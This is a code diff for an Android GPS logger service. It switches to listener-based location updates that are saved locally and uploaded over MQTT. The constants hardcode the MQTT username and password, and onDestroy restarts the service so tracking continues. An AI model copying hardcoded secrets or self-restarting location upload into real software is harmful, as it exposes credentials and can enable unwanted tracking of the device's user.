@@ -5,6 +5,7 @@ import android.content.*
 import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.location.Location
+import android.location.LocationListener
 import android.location.LocationManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
@@ -27,39 +28,63 @@ class GpsLoggerService : Service() {
         const val MQTT_USER  = "ars"
         const val MQTT_PASS  = "@r$"
         const val MQTT_TOPIC = "gps/phone1"
-        const val GPS_INTERVAL_MS    = 10 * 1000L
-        const val UPLOAD_INTERVAL_MS = 15 * 1000L
         const val CHANNEL_ID = "gps_service"
         const val NOTIF_ID   = 1
     }
 
-    private lateinit var handler: Handler
     private lateinit var db: GpsDatabase
     private lateinit var deviceId: String
+    private lateinit var locationManager: LocationManager
 
-    private val gpsRunnable = object : Runnable {
-        override fun run() {
-            captureLocation()
-            handler.postDelayed(this, GPS_INTERVAL_MS)
-        }
-    }
+    private val locationListener = object : LocationListener {
+        override fun onLocationChanged(location: Location) {
+            Log.d(TAG, "Location received: ${location.latitude}, ${location.longitude}")
+            val ts = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
+                .apply { timeZone = TimeZone.getTimeZone("UTC") }
+                .format(Date(location.time))
 
-    private val uploadRunnable = object : Runnable {
-        override fun run() {
+            db.insert(location.latitude, location.longitude, location.altitude, location.accuracy.toDouble(), ts)
             uploadPending()
-            handler.postDelayed(this, UPLOAD_INTERVAL_MS)
         }
+
+        override fun onProviderEnabled(provider: String) {}
+        override fun onProviderDisabled(provider: String) {}
     }
 
     override fun onCreate() {
         super.onCreate()
         deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
         db = GpsDatabase(this)
-        handler = Handler(Looper.getMainLooper())
         createNotificationChannel()
         startForegroundCompat()
-        handler.post(gpsRunnable)
-        handler.postDelayed(uploadRunnable, UPLOAD_INTERVAL_MS)
+        startLocationUpdates()
+    }
+
+    private fun startLocationUpdates() {
+        if (ContextCompat.checkSelfPermission(
+                this, android.Manifest.permission.ACCESS_FINE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED) return
+
+        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+
+        try {
+            locationManager.requestLocationUpdates(
+                LocationManager.GPS_PROVIDER,
+                10000L,  // 10 seconds
+                0f,
+                locationListener,
+                Looper.getMainLooper()
+            )
+            locationManager.requestLocationUpdates(
+                LocationManager.NETWORK_PROVIDER,
+                10000L,
+                0f,
+                locationListener,
+                Looper.getMainLooper()
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Location update error: ${e.message}")
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -70,50 +95,8 @@ class GpsLoggerService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        handler.removeCallbacks(gpsRunnable)
-        handler.removeCallbacks(uploadRunnable)
+        locationManager.removeUpdates(locationListener)
         startService(Intent(applicationContext, GpsLoggerService::class.java))
-    }
-
-    private fun captureLocation() {
-        try {
-            if (ContextCompat.checkSelfPermission(
-                    this, android.Manifest.permission.ACCESS_FINE_LOCATION
-                ) != PackageManager.PERMISSION_GRANTED) return
-
-            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            val providers = listOf(
-                LocationManager.GPS_PROVIDER,
-                LocationManager.NETWORK_PROVIDER,
-                LocationManager.PASSIVE_PROVIDER
-            )
-
-            var best: Location? = null
-            for (p in providers) {
-                if (lm.isProviderEnabled(p)) {
-                    val loc = lm.getLastKnownLocation(p)
-                    if (loc != null && (best == null || loc.accuracy < best.accuracy))
-                        best = loc
-                }
-            }
-
-            if (best != null) {
-                val ts = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
-                    .apply { timeZone = TimeZone.getTimeZone("UTC") }
-                    .format(Date(best.time))
-
-                db.insert(best.latitude, best.longitude, best.altitude, best.accuracy.toDouble(), ts)
-                Log.d(TAG, "Captured: ${best.latitude}, ${best.longitude}")
-
-                val intent = Intent("GPS_LOG_SAVED")
-                intent.putExtra("timestamp", System.currentTimeMillis())
-                sendBroadcast(intent)
-
-                uploadPending()
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "GPS error: ${e.message}")
-        }
     }
 
     private fun uploadPending() {
